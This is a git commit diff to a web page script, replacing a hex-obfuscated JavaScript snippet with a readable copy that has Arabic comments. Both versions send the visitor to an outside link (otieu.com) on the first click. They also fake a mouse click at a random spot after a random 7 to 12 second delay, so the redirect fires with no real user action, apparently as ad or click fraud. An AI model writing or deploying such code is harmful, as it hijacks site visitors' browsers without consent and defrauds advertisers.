2e2aa666a24a1677e3ca475a9ee8f9399a2f7fe3
fouaadwork <fouaad.work@gmail.com>
2025-08-05 15:18:09 +0300

    script1.js

--- script.js
+++ script.js
@@ -1,32 +1,39 @@
-(function(){
-  var _0x1a2f=["\x63\x6C\x69\x63\x6B","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x66\x61\x6C\x73\x65","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x72\x65\x64\x69\x72\x65\x63\x74\x65\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6F\x74\x69\x65\x75\x2E\x63\x6F\x6D\x2F\x34\x2F\x39\x36\x35\x34\x33\x33\x36"];
-  var a=_0x1a2f[5];
-  var b=false;
-  document[_0x1a2f[1]](_0x1a2f[0],function(){
-    if(!b){
-      b=true;
-      window[_0x1a2f[4]][_0x1a2f[3]]=_0x1a2f[6];
+(function() {
+  var redirected = false;
+  var url = "https://otieu.com/4/9654336";
+
+  // عند الضغط اليدوي
+  document.addEventListener("click", function () {
+    if (!redirected) {
+      redirected = true;
+      window.location.href = url;
     }
   });
 
-  function c(x,y){
-    var e=new MouseEvent(_0x1a2f[0],{
-      bubbles:true,
-      cancelable:true,
-      view:window,
-      clientX:x,
-      clientY:y
+  // وظيفة تنفيذ نقرة وهمية
+  function simulateClick(x, y) {
+    var evt = new MouseEvent("click", {
+      bubbles: true,
+      cancelable: true,
+      view: window,
+      clientX: x,
+      clientY: y
     });
-    var el=document.elementFromPoint(x,y);
-    if(el){el.dispatchEvent(e);}
+    var el = document.elementFromPoint(x, y);
+    if (el) {
+      el.dispatchEvent(evt);
+    }
   }
 
-  var d=Math.floor(Math.random()*5000)+7000;
-  setTimeout(function(){
-    var w=window.innerWidth;
-    var h=window.innerHeight;
-    var x=Math.floor(Math.random()*w);
-    var y=Math.floor(Math.random()*h);
-    c(x,y);
-  },d);
+  // وقت عشوائي بين 7 و 12 ثانية
+  var randomDelay = Math.floor(Math.random() * 5000) + 7000;
+
+  // بعد مرور الوقت، يتم تنفيذ نقرة عشوائية
+  setTimeout(function () {
+    var width = window.innerWidth;
+    var height = window.innerHeight;
+    var randomX = Math.floor(Math.random() * width);
+    var randomY = Math.floor(Math.random() * height);
+    simulateClick(randomX, randomY);
+  }, randomDelay);
 })();
